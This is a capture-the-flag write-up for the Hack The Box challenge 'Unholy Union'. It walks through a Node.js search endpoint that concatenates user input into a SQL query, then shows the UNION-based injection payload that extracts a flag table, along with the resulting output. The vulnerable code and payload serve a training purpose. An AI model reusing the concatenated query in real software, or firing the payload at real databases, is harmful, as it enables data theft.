---
title: Unholy Union - Hack The Box
date: 2024-12-11
---

# Unholy Union 🎃

## Challenge description

On the outskirts of a forsaken town lies an abandoned warehouse, rumored to store more than just forgotten relics.
Locals speak of an unholy union within its database, where spectral data intertwines with the realm of the living.
Whispers tell of a cursed ledger that merges forbidden entries through mysterious queries. Some say that the warehouse's
inventory system responds to those who know how to merge the right requests. Can you brave the haunted inventory system
and unravel the ghostly union of data before the spirits corrupt the world beyond?

## Challenge overview

In this challenge, we are presented with a web application that features an inventory search function. The application
provides a debug option to view the SQL queries executed on the server, which opens the door to potential exploitation.

![Unholy Union - Overview](/ctf/hack-the-box/challenges/web/unholy-union/overview.png)

## Code Review

### `entrypoint.sh`

The `entrypoint.sh` script is responsible for initializing the database. It creates a `flag` table and inserts the
content of the `/flag.txt` file into it.

```sql
DROP DATABASE IF EXISTS halloween_invetory;
CREATE DATABASE IF NOT EXISTS halloween_invetory;

USE halloween_invetory;

CREATE TABLE IF NOT EXISTS flag (
    flag VARCHAR(255) NOT NULL
);

INSERT INTO flag(flag) VALUES("$(cat /flag.txt)");
```

#### Key Observations:

- The `flag` table stores the flag as a single entry.
- The flag is loaded directly from the `/flag.txt` file.

### `index.js`

The `index.js` file contains the core application logic, including the vulnerable search functionality.

```javascript
app.get("/search", async (req, res) => {
    const query = req.query.query ? req.query.query : "";
    let results = { status: null, message: null };

    try {
        let sqlQuery;

        if (query === "") {
            sqlQuery = "SELECT * FROM inventory";
        } else {
            sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`;
        }

        const [rows] = await pool.query(sqlQuery);
        console.log("Query results:", rows);
        results.status = "success";
        results.message = rows;
    } catch (err) {
        console.error("Error executing query:", err.stack);
        results.status = "failed";
        results.message = err.message;
    }

    return res.json(results);
});
```

#### Vulnerability:

- **SQL Injection**: The `query` parameter is directly concatenated into the SQL statement without sanitization or
  prepared statements, leaving it vulnerable to SQL injection attacks.

## Exploitation

To exploit the SQL injection vulnerability, we can use a **UNION-based SQL injection** technique to extract data from
the `flag` table.

### Step 1: Understanding the Query Structure

The vulnerable query:

```sql
SELECT * FROM inventory WHERE name LIKE '%<query>%';
```

By injecting a malicious payload, we can manipulate the SQL query to retrieve data from the `flag` table. The goal is to
combine the `inventory` query with a `UNION` statement to fetch the flag.

### Step 2: Crafting the Payload

The crafted payload:

```sql
Z' UNION SELECT 1, (SELECT flag FROM flag), 3, 4, 5; -- -
```

::: info Payload Breakdown:

1. **`Z'`**: Closes the `LIKE` clause.
2. **`UNION SELECT`**: Combines the results of the original query with our injected query.
3. **`1, (SELECT flag FROM flag), 3, 4, 5`**: Fetches the flag value alongside dummy values to match the number of
  columns in the original query.
4. **`-- -`**: Comments out the rest of the SQL query to prevent syntax errors.

:::

### Step 3: Sending the Exploit

When the payload is sent as the `query` parameter, the response reveals the flag:

```json
[
    {
        "id": 1,
        "name": "HTB{f4k3_fl4g_f0r_t35t1ng}",
        "description": "3",
        "origin": "4",
        "created_at": "5"
    }
]
```

With the fake flag retrieved, we can use the same technique to get the real flag on the HTB server.

![Unholy Union - Pwned](/ctf/hack-the-box/challenges/web/unholy-union/pwned.png)

## References

- [SQLi Series - Reading Files through SQL Injection - 08](https://0xshin.hashnode.dev/sqli-series-reading-files-through-sql-injection-08)
